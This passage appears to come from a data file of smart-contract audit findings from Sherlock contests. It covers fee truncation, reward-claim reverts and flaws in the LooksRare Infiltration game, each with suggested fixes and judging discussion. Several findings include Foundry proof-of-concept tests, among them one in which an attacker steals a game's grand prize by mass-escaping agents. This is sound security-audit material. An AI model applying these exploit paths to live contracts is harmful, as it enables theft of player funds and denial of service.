newValue.interfaceFee.receiver,\n            newValue.interfaceFee.unwrap,\n            bytes11(0)\n        );\n    }\n```\n\nWe can see that when saving, it is forcibly converted to `uint40`, as in `uint40(UFixed6.unwrap(newValue.interfaceFee.amount))`. The order can be saved successfully, but the actual storage may be truncated to `0`.ч```\nlibrary TriggerOrderLib {\n    function store(TriggerOrderStorage storage self, TriggerOrder memory newValue) internal {\n        if (newValue.side > type(uint8).max) revert TriggerOrderStorageInvalidError();\n        if (newValue.comparison > type(int8).max) revert TriggerOrderStorageInvalidError();\n        if (newValue.comparison < type(int8).min) revert TriggerOrderStorageInvalidError();\n        if (newValue.fee.gt(UFixed6.wrap(type(uint64).max))) revert TriggerOrderStorageInvalidError();\n        if (newValue.price.gt(Fixed6.wrap(type(int64).max))) revert TriggerOrderStorageInvalidError();\n        if (newValue.price.lt(Fixed6.wrap(type(int64).min))) revert TriggerOrderStorageInvalidError();\n        if (newValue.delta.gt(Fixed6.wrap(type(int64).max))) revert TriggerOrderStorageInvalidError();\n        if (newValue.delta.lt(Fixed6.wrap(type(int64).min))) revert TriggerOrderStorageInvalidError();\n        if (newValue.interfaceFee.amount.gt(UFixed6.wrap(type(uint48).max))) revert TriggerOrderStorageInvalidError();\n\n        self.value = StoredTriggerOrder(\n            uint8(newValue.side),\n            int8(newValue.comparison),\n            uint64(UFixed6.unwrap(newValue.fee)),\n            int64(Fixed6.unwrap(newValue.price)),\n            int64(Fixed6.unwrap(newValue.delta)),\n// Remove the line below\n          uint40(UFixed6.unwrap(newValue.interfaceFee.amount)),\n// Add the line below\n          uint48(UFixed6.unwrap(newValue.interfaceFee.amount)),\n            newValue.interfaceFee.receiver,\n            newValue.interfaceFee.unwrap,\n            bytes11(0)\n        );\n    }\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\npanprog commented:\nmedium, because there seems to really be an incorrect cast to uint40 instead of uint48, so the fee might be stored incorrectly and incorrect (smaller) fee will be charged, losing funds for the interfaceчFor orders where `interfaceFee.amount` is greater than `1.1M`, the order can be saved successfully, but the actual storage may be truncated to `0`. This is not what users expect and may lead to incorrect fee payments when the order is executed. Although a fee of `1.1M` is large, it is not impossible.\nCode Snippet\nTool used\nManual Review
vault.claimReward() If have a market without reward token, it may cause all markets to be unable to retrieve rewards.чmediumч```\n    function claimReward() external onlyOwner {\n        for (uint256 marketId; marketId < totalMarkets; marketId++) {\n            _registrations[marketId].read().market.claimReward();\n            _registrations[marketId].read().market.reward().push(factory().owner());\n        }\n    }\n```\nчIn `vault.claimReward()`, it will loop through all `market` of `vault` to execute `claimReward()`, and transfer `rewards` to `factory().owner()`. If one of the markets does not have `rewards`, that is, `rewardToken` is not set, `Token18 reward = address(0)`. Currently, the loop does not make this judgment `reward != address(0)`, it will also execute `market.claimReward()`, and the entire method will `revert`. This leads to other markets with `rewards` also being unable to retrieve `rewards`.\nThe current implementation of `vault.claimReward()` is as follows:\n```\n    function claimReward() external onlyOwner {\n        for (uint256 marketId; marketId < totalMarkets; marketId++) {\n            _registrations[marketId].read().market.claimReward();\n            _registrations[marketId].read().market.reward().push(factory().owner());\n        }\n    }\n```\n\nWe can see that the method loops through all the `market` and executes `market.claimReward()`, and `reward().push()`.\n```\ncontract Market is IMarket, Instance, ReentrancyGuard {\n    /// @dev The token that incentive rewards are paid in\n  Token18 public reward;\n\n    function initialize(IMarket.MarketDefinition calldata definition_) external initializer(1) {\n        __Instance__initialize();\n        __ReentrancyGuard__initialize();\n\n        token = definition_.token;\n        oracle = definition_.oracle;\n        payoff = definition_.payoff;\n    }\n// rest of code\n\n\nlibrary MarketParameterStorageLib {\n// rest of code\n    function validate(\n        MarketParameter memory self,\n        ProtocolParameter memory protocolParameter,\n        Token18 reward\n    ) public pure {\n        if (self.settlementFee.gt(protocolParameter.maxFeeAbsolute)) revert MarketParameterStorageInvalidError();\n\n        if (self.fundingFee.max(self.interestFee).max(self.positionFee).gt(protocolParameter.maxCut))\n            revert MarketParameterStorageInvalidError();\n\n        if (self.oracleFee.add(self.riskFee).gt(UFixed6Lib.ONE)) revert MarketParameterStorageInvalidError();\n\n        if (\n          reward.isZero() &&\n          (!self.makerRewardRate.isZero() || !self.longRewardRate.isZero() || !self.shortRewardRate.isZero())\n        ) revert MarketParameterStorageInvalidError();\n```\n\nIf there is such a market, the current `vault.claimReward()` will `revert`, causing other markets with `rewards` to also be unable to retrieve `rewards`.ч```\n    function claimReward() external onlyOwner {\n        for (uint256 marketId; marketId < totalMarkets; marketId// Add the line below\n// Add the line below\n) {\n// Add the line below\n           if (_registrations[marketId].read().market.reward().isZero()) continue;\n            _registrations[marketId].read().market.claimReward();\n            _registrations[marketId].read().market.reward().push(factory().owner());\n        }\n    }\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\npanprog commented:\nborderline low/medium, vault.claimReward will indeed revert if any market reward is not set, but this can also be thought of as an admin error choosing incorrect markets\nkbrizzle\nThis is one of many configuration gotchas present in the Vault -- it is valid, however unsure if this qualifies as a medium, especially since it only affects an admin helper function (claimReward()).чIf the `vault` contains markets without `rewards`, it will cause other markets with `rewards` to also be unable to retrieve `rewards`.\nCode Snippet\nTool used\nManual Review
_killWoundedAgentsчhighч```\n    function _killWoundedAgents(\n        uint256 roundId,\n        uint256 currentRoundAgentsAlive\n    ) private returns (uint256 deadAgentsCount) {\n        // rest of code\n        for (uint256 i; i < woundedAgentIdsCount; ) {\n            uint256 woundedAgentId = woundedAgentIdsInRound[i.unsafeAdd(1)];\n\n            uint256 index = agentIndex(woundedAgentId);\n          if (agents[index].status == AgentStatus.Wounded) {\n                // rest of code\n            }\n\n            // rest of code\n        }\n\n        emit Killed(roundId, woundedAgentIds);\n    }\n```\nчThe `_killWoundedAgents` function only checks the status of the agent, not when it was wounded.\n```\n    function _killWoundedAgents(\n        uint256 roundId,\n        uint256 currentRoundAgentsAlive\n    ) private returns (uint256 deadAgentsCount) {\n        // rest of code\n        for (uint256 i; i < woundedAgentIdsCount; ) {\n            uint256 woundedAgentId = woundedAgentIdsInRound[i.unsafeAdd(1)];\n\n            uint256 index = agentIndex(woundedAgentId);\n          if (agents[index].status == AgentStatus.Wounded) {\n                // rest of code\n            }\n\n            // rest of code\n        }\n\n        emit Killed(roundId, woundedAgentIds);\n    }\n```\n\nSo when `fulfillRandomWords` kills agents that were wounded and unhealed at round `currentRoundId - ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD`, it will also kill the agent who was healed and wounded again after that round.\nAlso, since `fulfillRandomWords` first draws the new wounded agents before kills agents, in the worst case scenario, agent could die immediately after being wounded in this round.\n```\nif (activeAgents > NUMBER_OF_SECONDARY_PRIZE_POOL_WINNERS) {\n  uint256 woundedAgents = _woundRequestFulfilled(\n        currentRoundId,\n        currentRoundAgentsAlive,\n        activeAgents,\n        currentRandomWord\n    );\n\n    uint256 deadAgentsFromKilling;\n    if (currentRoundId > ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD) {\n      deadAgentsFromKilling = _killWoundedAgents({\n            roundId: currentRoundId.unsafeSubtract(ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD),\n            currentRoundAgentsAlive: currentRoundAgentsAlive\n        });\n    }\n```\n\n```\nfunction test_poc() public {\n\n    _startGameAndDrawOneRound();\n\n    uint256[] memory randomWords = _randomWords();\n    uint256[] memory woundedAgentIds;\n\n    for (uint256 roundId = 2; roundId <= ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD + 1; roundId++) {\n\n        if(roundId == 2) { // heal agent. only woundedAgentIds[0] dead.\n            (woundedAgentIds, ) = infiltration.getRoundInfo({roundId: 1});\n            assertEq(woundedAgentIds.length, 20);\n\n            _drawXRounds(1);\n\n            _heal({roundId: 3, woundedAgentIds: woundedAgentIds});\n\n            _startNewRound();\n\n            // everyone except woundedAgentIds[0] is healed\n            uint256 agentIdThatWasKilled = woundedAgentIds[0];\n\n            IInfiltration.HealResult[] memory healResults = new IInfiltration.HealResult[](20);\n            for (uint256 i; i < 20; i++) {\n                healResults[i].agentId = woundedAgentIds[i];\n\n                if (woundedAgentIds[i] == agentIdThatWasKilled) {\n                    healResults[i].outcome = IInfiltration.HealOutcome.Killed;\n                } else {\n                    healResults[i].outcome = IInfiltration.HealOutcome.Healed;\n                }\n            }\n\n            expectEmitCheckAll();\n            emit HealRequestFulfilled(3, healResults);\n\n            expectEmitCheckAll();\n            emit RoundStarted(4);\n\n            randomWords[0] = (69 * 10_000_000_000) + 9_900_000_000; // survival rate 99%, first one gets killed\n\n            vm.prank(VRF_COORDINATOR);\n            VRFConsumerBaseV2(address(infiltration)).rawFulfillRandomWords(_computeVrfRequestId(3), randomWords);\n\n            for (uint256 i; i < woundedAgentIds.length; i++) {\n                if (woundedAgentIds[i] != agentIdThatWasKilled) {\n                    _assertHealedAgent(woundedAgentIds[i]);\n                }\n            }\n\n            roundId += 2; // round 2, 3 used for healing\n        }\n\n        _startNewRound();\n\n        // Just so that each round has different random words\n        randomWords[0] += roundId;\n\n        if (roundId == ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD + 1) { // wounded agents at round 1 are healed, only woundedAgentIds[0] was dead.\n            (uint256[] memory woundedAgentIdsFromRound, ) = infiltration.getRoundInfo({\n                roundId: uint40(roundId - ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD)\n            });\n\n            // find re-wounded agent after healed\n            uint256[] memory woundedAfterHeal = new uint256[](woundedAgentIds.length);\n            uint256 totalWoundedAfterHeal;\n            for (uint256 i; i < woundedAgentIds.length; i ++){\n                uint256 index = infiltration.agentIndex(woundedAgentIds[i]);\n                IInfiltration.Agent memory agent = infiltration.getAgent(index);\n                if (agent.status == IInfiltration.AgentStatus.Wounded) {\n                    woundedAfterHeal[i] = woundedAgentIds[i]; // re-wounded agent will be killed\n                    totalWoundedAfterHeal++;\n                }\n                else{\n                    woundedAfterHeal[i] = 0; // set not wounded again 0\n                }\n\n            }\n            expectEmitCheckAll();\n            emit Killed(roundId - ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD, woundedAfterHeal);\n        }\n\n        expectEmitCheckAll();\n        emit RoundStarted(roundId + 1);\n\n        uint256 requestId = _computeVrfRequestId(uint64(roundId));\n        vm.prank(VRF_COORDINATOR);\n        VRFConsumerBaseV2(address(infiltration)).rawFulfillRandomWords(requestId, randomWords);\n    }\n}\n```\nчCheck woundedAt at `_killWoundedAgents`\n```\n    function _killWoundedAgents(\n        uint256 roundId,\n        uint256 currentRoundAgentsAlive\n    ) private returns (uint256 deadAgentsCount) {\n        // rest of code\n        for (uint256 i; i < woundedAgentIdsCount; ) {\n            uint256 woundedAgentId = woundedAgentIdsInRound[i.unsafeAdd(1)];\n\n            uint256 index = agentIndex(woundedAgentId);\n// Remove the line below\n           if (agents[index].status == AgentStatus.Wounded) {\n// Add the line below\n           if (agents[index].status == AgentStatus.Wounded && agents[index].woundedAt == roundId) {\n                // rest of code\n            }\n\n            // rest of code\n        }\n\n        emit Killed(roundId, woundedAgentIds);\n    }\n```\n\nDiscussion\n0xhiroshi\nhttps://github.com/LooksRare/contracts-infiltration/pull/148\n0xhiroshi\nhttps://github.com/LooksRare/contracts-infiltration/pull/164\nSergeKireev\nFix LGTMчThe user pays tokens to keep the agent alive, but agent will die even if agent success to healed. The user has lost tokens and is forced out of the game.\nCode Snippet\nTool used\nManual Review
Attacker can steal reward of actual winner by force ending the gameчhighч```\nuint256 activeAgents = gameInfo.activeAgents;\n        if (activeAgents == 1) {\n            revert GameOver();\n        }\n```\nч"Currently following scenario is possible: There is an attacker owning some lower index agents and some higher index agents. There is a normal user owing one agent with an index between the attackers agents. If one of the attackers agents with an lower index gets wounded, he can escape all other agents and will instantly win the game, even if the other User has still one active agent.\nThis is possible because because the winner is determined by the agent index, and escaping all agents at once wont kill the wounded agent because the game instantly ends.\nFollowing check inside startNewRound prevents killing of wounded agents by starting a new round:\n```\nuint256 activeAgents = gameInfo.activeAgents;\n        if (activeAgents == 1) {\n            revert GameOver();\n        }\n```\n\nFollowing check inside of claimPrize pays price to first ID agent:\n```\nuint256 agentId = agents[1].agentId;\n_assertAgentOwnership(agentId);\n```\n\nSee following POC:\nPOC\n```\nfunction test_forceWin() public {\n        address attacker = address(1337);\n\n        //prefund attacker and user1\n        vm.deal(user1, PRICE * MAX_MINT_PER_ADDRESS);\n        vm.deal(attacker, PRICE * MAX_MINT_PER_ADDRESS);\n\n        // MINT some agents\n        vm.warp(_mintStart());\n        // attacker wants to make sure he owns a bunch of agents with low IDs!!\n        vm.prank(attacker);\n        infiltration.mint{value: PRICE * 30}({quantity: 30});\n        // For simplicity we mint only 1 agent to user 1 here, but it could be more, they could get wounded, etc.\n        vm.prank(user1);\n        infiltration.mint{value: PRICE *1}({quantity: 1});\n        //Attacker also wants a bunch of agents with the highest IDs, as they are getting swapped with the killed agents (move forward)\n        vm.prank(attacker);\n        infiltration.mint{value: PRICE * 30}({quantity: 30});\n    \n        vm.warp(_mintEnd());\n\n        //start the game\n        vm.prank(owner);\n        infiltration.startGame();\n\n        vm.prank(VRF_COORDINATOR);\n        uint256[] memory randomWords = new uint256[](1);\n        randomWords[0] = 69_420;\n        VRFConsumerBaseV2(address(infiltration)).rawFulfillRandomWords(_computeVrfRequestId(1), randomWords);\n        // Now we are in round 2 we do have 1 wounded agent (but we can imagine any of our agent got wounded, doesn´t really matter)\n        \n        // we know with our HARDCODED RANDOMNESS THAT AGENT 3 gets wounded!!\n\n        // Whenever we get in a situation, that we own all active agents, but 1 and our agent has a lower index we can instant win the game!!\n        // This is done by escaping all agents, at once, except the lowest index\n        uint256[] memory escapeIds = new uint256[](59);\n        escapeIds[0] = 1;\n        escapeIds[1] = 2;\n        uint256 i = 4; //Scipping our wounded AGENT 3\n        for(; i < 31;) {\n            escapeIds[i-2] = i;\n            unchecked {++i;}\n        }\n        //skipping 31 as this owned by user1\n        unchecked {++i;}\n        for(; i < 62;) {\n            escapeIds[i-3] = i;\n            unchecked {++i;}\n        }\n        vm.prank(attacker);\n        infiltration.escape(escapeIds);\n\n        (uint16 activeAgents, uint16 woundedAgents, , uint16 deadAgents, , , , , , , ) = infiltration.gameInfo();\n        console.log(""Active"", activeAgents);\n        assertEq(activeAgents, 1);\n        // This will end the game instantly.\n        //owner should not be able to start new round\n        vm.roll(block.number + BLOCKS_PER_ROUND);\n        vm.prank(owner);\n        vm.expectRevert();\n        infiltration.startNewRound();\n\n        //Okay so the game is over, makes sense!\n        // Now user1 has the only active AGENT, so he should claim the grand prize!\n        // BUT user1 cannot\n        vm.expectRevert(IInfiltration.NotAgentOwner.selector);\n        vm.prank(user1);\n        infiltration.claimGrandPrize();\n\n        //instead the attacker can:\n        vm.prank(attacker);\n        infiltration.claimGrandPrize();\n        \n```\n"чStart a new Round before the real end of game to clear all wounded agents and reorder IDs.\nDiscussion\n0xhiroshi\nhttps://github.com/LooksRare/contracts-infiltration/pull/154\nSergeKireev\nFix LGTMчAttacker can steal the grand price of the actual winner by force ending the game trough escapes.\nThis also introduces problems if there are other players with wounded agents but lower < 50 TokenID, they can claim prices for wounded agents, which will break parts of the game logic.\nCode Snippet\nTool used\nManual Review
Agents with Healing Opportunity Will Be Terminated Directly if The `escape` Reduces activeAgents to the Number of `NUMBER_OF_SECONDARY_PRIZE_POOL_WINNERS` or Fewerчmediumч```\n    function heal(uint256[] calldata agentIds) external nonReentrant {\n        _assertFrontrunLockIsOff();\n//@audit If there are not enough activeAgents, heal is disabled\n        if (gameInfo.activeAgents <= NUMBER_OF_SECONDARY_PRIZE_POOL_WINNERS) {\n            revert HealingDisabled();\n        }\n```\nч"In each round, agents have the opportunity to either `escape` or `heal` before the `_requestForRandomness` function is called. However, the order of execution between these two functions is not specified, and anyone can be executed at any time just before `startNewRound`. Typically, this isn't an issue. However, the problem arises when there are only a few Active Agents left in the game.\nOn one hand, the `heal` function requires that the number of `gameInfo.activeAgents` is greater than `NUMBER_OF_SECONDARY_PRIZE_POOL_WINNERS`.\n```\n    function heal(uint256[] calldata agentIds) external nonReentrant {\n        _assertFrontrunLockIsOff();\n//@audit If there are not enough activeAgents, heal is disabled\n        if (gameInfo.activeAgents <= NUMBER_OF_SECONDARY_PRIZE_POOL_WINNERS) {\n            revert HealingDisabled();\n        }\n```\n\nOn the other hand, the `escape` function will directly set the status of agents to ""ESCAPE"" and reduce the count of `gameInfo.activeAgents`.\n```\n   function escape(uint256[] calldata agentIds) external nonReentrant {\n        _assertFrontrunLockIsOff();\n\n        uint256 agentIdsCount = agentIds.length;\n        _assertNotEmptyAgentIdsArrayProvided(agentIdsCount);\n\n        uint256 activeAgents = gameInfo.activeAgents;\n        uint256 activeAgentsAfterEscape = activeAgents - agentIdsCount;\n        _assertGameIsNotOverAfterEscape(activeAgentsAfterEscape);\n\n        uint256 currentRoundAgentsAlive = agentsAlive();\n\n        uint256 prizePool = gameInfo.prizePool;\n        uint256 secondaryPrizePool = gameInfo.secondaryPrizePool;\n        uint256 reward;\n        uint256[] memory rewards = new uint256[](agentIdsCount);\n\n        for (uint256 i; i < agentIdsCount; ) {\n            uint256 agentId = agentIds[i];\n            _assertAgentOwnership(agentId);\n\n            uint256 index = agentIndex(agentId);\n            _assertAgentStatus(agents[index], agentId, AgentStatus.Active);\n\n            uint256 totalEscapeValue = prizePool / currentRoundAgentsAlive;\n            uint256 rewardForPlayer = (totalEscapeValue * _escapeMultiplier(currentRoundAgentsAlive)) /\n                ONE_HUNDRED_PERCENT_IN_BASIS_POINTS;\n            rewards[i] = rewardForPlayer;\n            reward += rewardForPlayer;\n\n            uint256 rewardToSecondaryPrizePool = (totalEscapeValue.unsafeSubtract(rewardForPlayer) *\n                _escapeRewardSplitForSecondaryPrizePool(currentRoundAgentsAlive)) / ONE_HUNDRED_PERCENT_IN_BASIS_POINTS;\n\n            unchecked {\n                prizePool = prizePool - rewardForPlayer - rewardToSecondaryPrizePool;\n            }\n            secondaryPrizePool += rewardToSecondaryPrizePool;\n\n            _swap({\n                currentAgentIndex: index,\n                lastAgentIndex: currentRoundAgentsAlive,\n                agentId: agentId,\n                newStatus: AgentStatus.Escaped\n            });\n\n            unchecked {\n                --currentRoundAgentsAlive;\n                ++i;\n            }\n        }\n\n        // This is equivalent to\n        // unchecked {\n        //     gameInfo.activeAgents = uint16(activeAgentsAfterEscape);\n        //     gameInfo.escapedAgents += uint16(agentIdsCount);\n        // }\n```\n\nThrerefore, if the `heal` function is invoked first then the corresponding Wounded Agents will be healed in function `fulfillRandomWords`. If the `escape` function is invoked first and the number of `gameInfo.activeAgents` becomes equal to or less than `NUMBER_OF_SECONDARY_PRIZE_POOL_WINNERS`, the `heal` function will be disable. This obviously violates the fairness of the game.\nExample\nConsider the following situation:\nAfter Round N, there are 100 agents alive. And, 1 Active Agent wants to `escape` and 10 Wounded Agents want to `heal`.\nRound N:\nActive Agents: 51\nWounded Agents: 49\nHealing Agents: 0\nAccording to the order of execution, there are two situations. Please note that the result is calculated only after `_healRequestFulfilled`, so therer are no new wounded or dead agents\nFirst, invoking `escape` before `heal`. `heal` is disable and all Wounded Agents are killed because there are not enough Active Agents.\nRound N+1:\nActive Agents: 50\nWounded Agents: 0\nHealing Agents: 0\nSecond, invoking `heal` before `escape`. Suppose that `heal` saves 5 agents, and we got:\nRound N+1:\nActive Agents: 55\nWounded Agents: 39\nHealing Agents: 0\nObviously, different execution orders lead to drastically different outcomes, which affects the fairness of the game."чIt is advisable to ensure that the `escape` function is always called after the `heal` function in every round. This guarantees that every wounded agent has the opportunity to `heal` themselves when there are a sufficient number of `activeAgents` at the start of each round. This approach can enhance fairness and gameplay balance.\nDiscussion\n0xhiroshi\nThis is a valid PvP game strategy.\nnevillehuang\nI can see sponsors view of disputing these issues given this protocol focuses on a PVP game. The difference between this two #43 and #57 and issue #98 is because #98 actually triggers an invalid game state and #84 truly skews the odds, but #43 and #57 don't fall into either categories.\nHowever, due to a lack of concrete details on PVP strategies, I also see watsons point of view of how the use of `escape()` and `heal()` can cause unfair game mechanics. While I also understand the sponsor's view of difficulty in predicting PVP strategies, I think it could have been avoided by including this as potential risks in the accepted risks/known issues of sherlocks contest details (which is the source of truth for contest details).\nAs such, I am going to keep #43 and #57 as medium severity findings, given the attack path requires specific conditions that would otherwise have been valid PVP strategies.\n0xhiroshi\nWe won't further dispute this issue and we won't fix it.\nnevillehuang\nAfter further considerations, going to mark this issue as invalid due to the analysis of the following test. It supports the sponsor claim that instant killing of wounded agents once active agents fall below `NUMBER_OF_SECONDARY_PRIZE_POOL_WINNERS` (50) is a valid PVP strategy.\nIt first simulates active agents falling to 51\nThen it attempts to heal 3 wounded agents (ids: 8534, 3214 and 6189)\nIt then escapes 2 agents to make active agents fall below 49\nA new round is started, instantly killing all wounded agents\nOnly #29 and #34 mentions the other root cause of instantly ending the game with `escape()` (which allows immediate claiming of grand prize) so this 2 issues will be dupped with #98.чIf some Active Agents choose to escape, causing the count of `activeAgents` to become equal to or less than `NUMBER_OF_SECONDARY_PRIZE_POOL_WINNERS`, the Wounded Agents will lose their final chance to heal themselves.\nThis situation can significantly impact the game's fairness. The Wounded Agents would have otherwise had the opportunity to heal themselves and continue participating in the game. However, the escape of other agents leads to their immediate termination, depriving them of that chance.\nCode Snippet\nTool used\nManual Review
Wound agent can't invoke heal in the next roundчmediumч```\n    function test_heal_in_next_round_v1() public {\n        _startGameAndDrawOneRound();\n\n        _drawXRounds(11);\n\n\n        (uint256[] memory woundedAgentIds, ) = infiltration.getRoundInfo({roundId: 12});\n\n        address agentOwner = _ownerOf(woundedAgentIds[0]);\n        looks.mint(agentOwner, HEAL_BASE_COST);\n\n        vm.startPrank(agentOwner);\n        _grantLooksApprovals();\n        looks.approve(TRANSFER_MANAGER, HEAL_BASE_COST);\n\n        uint256[] memory agentIds = new uint256[](1);\n        agentIds[0] = woundedAgentIds[0];\n\n        uint256[] memory costs = new uint256[](1);\n        costs[0] = HEAL_BASE_COST;\n\n        //get gameInfo\n        (,,,,,uint40 currentRoundId,,,,,) = infiltration.gameInfo();\n        assert(currentRoundId == 13);\n\n        //get agent Info\n        IInfiltration.Agent memory agentInfo = infiltration.getAgent(woundedAgentIds[0]);\n        assert(agentInfo.woundedAt == 12);\n\n        //agent can't invoke heal in the next round.\n        vm.expectRevert(IInfiltration.HealingMustWaitAtLeastOneRound.selector);\n        infiltration.heal(agentIds);\n    }\n```\nчAssume players being marked as wounded in the round `12` , players cannot invoke `heal` in the next round 13\n```\n    function test_heal_in_next_round_v1() public {\n        _startGameAndDrawOneRound();\n\n        _drawXRounds(11);\n\n\n        (uint256[] memory woundedAgentIds, ) = infiltration.getRoundInfo({roundId: 12});\n\n        address agentOwner = _ownerOf(woundedAgentIds[0]);\n        looks.mint(agentOwner, HEAL_BASE_COST);\n\n        vm.startPrank(agentOwner);\n        _grantLooksApprovals();\n        looks.approve(TRANSFER_MANAGER, HEAL_BASE_COST);\n\n        uint256[] memory agentIds = new uint256[](1);\n        agentIds[0] = woundedAgentIds[0];\n\n        uint256[] memory costs = new uint256[](1);\n        costs[0] = HEAL_BASE_COST;\n\n        //get gameInfo\n        (,,,,,uint40 currentRoundId,,,,,) = infiltration.gameInfo();\n        assert(currentRoundId == 13);\n\n        //get agent Info\n        IInfiltration.Agent memory agentInfo = infiltration.getAgent(woundedAgentIds[0]);\n        assert(agentInfo.woundedAt == 12);\n\n        //agent can't invoke heal in the next round.\n        vm.expectRevert(IInfiltration.HealingMustWaitAtLeastOneRound.selector);\n        infiltration.heal(agentIds);\n    }\n```\nч```\n    // No need to check if the heal deadline has passed as the agent would be killed\n    unchecked {\n-       if (currentRoundId - woundedAt < 2) {\n-       if (currentRoundId - woundedAt < 1) {\n            revert HealingMustWaitAtLeastOneRound();\n        }\n    }\n```\n\nDiscussion\nnevillehuang\n@0xhiroshi Any reason why you disagree with the severity? It does mentioned in the docs that the first round user can heal is right after the round his agent is wounded. The above PoC also shows how a user cannot heal a wounded agent at round 13 when his agent was wounded at round 12.\n0xhiroshi\nhttps://github.com/LooksRare/contracts-infiltration/pull/151\nSergeKireev\nFix LGTMчUser have to wait for 1 more round which led to the odds for an Agent to heal successfully start at 99% at Round 1 reduce to 98% at Round 2.\nCode Snippet\n```\n    // No need to check if the heal deadline has passed as the agent would be killed\n    unchecked {\n        if (currentRoundId - woundedAt < 2) {\n            revert HealingMustWaitAtLeastOneRound();\n        }\n    }\n```\n\nTool used\nManual Review
fulfillRandomWords() could revert under certain circumstancesчmediumч```\nfunction test_fulfillRandomWords_revert() public {\n        _startGameAndDrawOneRound();\n\n        _drawXRounds(48);\n        \n        uint256 counter = 0;\n        uint256[] memory wa = new uint256[](30);\n        uint256 totalCost = 0;\n\n        for (uint256 j=2; j <= 6; j++) \n        {\n            (uint256[] memory woundedAgentIds, ) = infiltration.getRoundInfo({roundId: j});\n\n            uint256[] memory costs = new uint256[](woundedAgentIds.length);\n            for (uint256 i; i < woundedAgentIds.length; i++) {\n                costs[i] = HEAL_BASE_COST;\n                wa[counter] = woundedAgentIds[i];\n                counter++;\n                if(counter > 29) break;\n            }\n\n            if(counter > 29) break;\n        }\n        \n        \n        totalCost = HEAL_BASE_COST * wa.length;\n        looks.mint(user1, totalCost);\n\n        vm.startPrank(user1);\n        _grantLooksApprovals();\n        looks.approve(TRANSFER_MANAGER, totalCost);\n\n\n        infiltration.heal(wa);\n        vm.stopPrank();\n\n        _drawXRounds(1);\n    }\n```\nчCrucial part of my POC is the variable AGENTS_TO_WOUND_PER_ROUND_IN_BASIS_POINTS. I communicated with the protocol's team that they plan to set it to 20 initially but it is possible to have a different value for it in future. For the POC i used 30.\n```\nfunction test_fulfillRandomWords_revert() public {\n        _startGameAndDrawOneRound();\n\n        _drawXRounds(48);\n        \n        uint256 counter = 0;\n        uint256[] memory wa = new uint256[](30);\n        uint256 totalCost = 0;\n\n        for (uint256 j=2; j <= 6; j++) \n        {\n            (uint256[] memory woundedAgentIds, ) = infiltration.getRoundInfo({roundId: j});\n\n            uint256[] memory costs = new uint256[](woundedAgentIds.length);\n            for (uint256 i; i < woundedAgentIds.length; i++) {\n                costs[i] = HEAL_BASE_COST;\n                wa[counter] = woundedAgentIds[i];\n                counter++;\n                if(counter > 29) break;\n            }\n\n            if(counter > 29) break;\n        }\n        \n        \n        totalCost = HEAL_BASE_COST * wa.length;\n        looks.mint(user1, totalCost);\n\n        vm.startPrank(user1);\n        _grantLooksApprovals();\n        looks.approve(TRANSFER_MANAGER, totalCost);\n\n\n        infiltration.heal(wa);\n        vm.stopPrank();\n\n        _drawXRounds(1);\n    }\n```\nч"A couple of ideas :\nYou can limit the value of AGENTS_TO_WOUND_PER_ROUND_IN_BASIS_POINTS to a small enough number so that it is 100% sure it will not reach the gas limit.\nConsider simply storing the randomness and taking more complex follow-on actions in separate contract calls as stated in the ""Security Considerations"" section of the VRF's docs.\nDiscussion\nnevillehuang\nAccepted risks, the KEYWORDS here are:\nperiods of network congestion --> this causes the hard code gas fallback to revert --> accepted risk\nAny reason causing randomness request to not be fufilled --> If request for randomness is not fufilled due to ANY reason, even if highilighted in a submission, it is not a accepted finding since it is an accepted risk LooksRare are willing to take\nIn the case of extended periods of network congestion or any reason causing the randomness request not to be fulfilled, the contract owner is able to withdraw everything after approximately 36 hours.\ngstoyanovbg\nEscalate I disagree with the comment of @nevillehuang . Imagine a situation in which you start a game with 10,000 participants, go through many rounds, and at one point, the game stops and cannot continue. As far as I understand, the judge's claim is that the funds can be withdrawn after a certain time, which is true. However, will the gas fees be returned to all users who have healed agents or traded them on the open market in some way? And what about the time that the players have devoted to winning a game that suddenly stops due to a bug and cannot continue? Every player may have claims for significant missed benefits (and losses from gas fees). Now, imagine that this continues to happen again and again in some of the subsequent games. Will anyone even invest time and resources to play this game? My request to the judges is to review my report again because it has nothing to do with 'periods of network congestion' as stated and this issue is not listed under the ""Accepted risks"" section. Thanks. P.S During the contest i discussed this with the sponsor and confirmed that this is an issue (probably doesn't matter but wanted to mention it)\nsherlock-admin2\nEscalate I disagree with the comment of @nevillehuang . Imagine a situation in which you start a game with 10,000 participants, go through many rounds, and at one point, the game stops and cannot continue. As far as I understand, the judge's claim is that the funds can be withdrawn after a certain time, which is true. However, will the gas fees be returned to all users who have healed agents or traded them on the open market in some way? And what about the time that the players have devoted to winning a game that suddenly stops due to a bug and cannot continue? Every player may have claims for significant missed benefits (and losses from gas fees). Now, imagine that this continues to happen again and again in some of the subsequent games. Will anyone even invest time and resources to play this game? My request to the judges is to review my report again because it has nothing to do with 'periods of network congestion' as stated and this issue is not listed under the ""Accepted risks"" section. Thanks. P.S During the contest i discussed this with the sponsor and confirmed that this is an issue (probably doesn't matter but wanted to mention it)\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nPlamenTSV\nEscalate My issue 107 is the same and I agree with the above statement, as this is not an occurance that can randomly happen once, depending on potential parameter changes it can become extremely likely to happen every time. If every game has a high chance to get permanently dosed, even if emergency withdrawal is available, the game itself becomes unplayable. The accepted risks cover network congestion and the 36 period, but that period does not solve the insolvency, it just refunds some funds, not even everything that costed players and congestion is not the cause, but the badly gas optimized function.\nsherlock-admin2\nEscalate My issue 107 is the same and I agree with the above statement, as this is not an occurance that can randomly happen once, depending on potential parameter changes it can become extremely likely to happen every time. If every game has a high chance to get permanently dosed, even if emergency withdrawal is available, the game itself becomes unplayable. The accepted risks cover network congestion and the 36 period, but that period does not solve the insolvency, it just refunds some funds, not even everything that costed players and congestion is not the cause, but the badly gas optimized function.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window 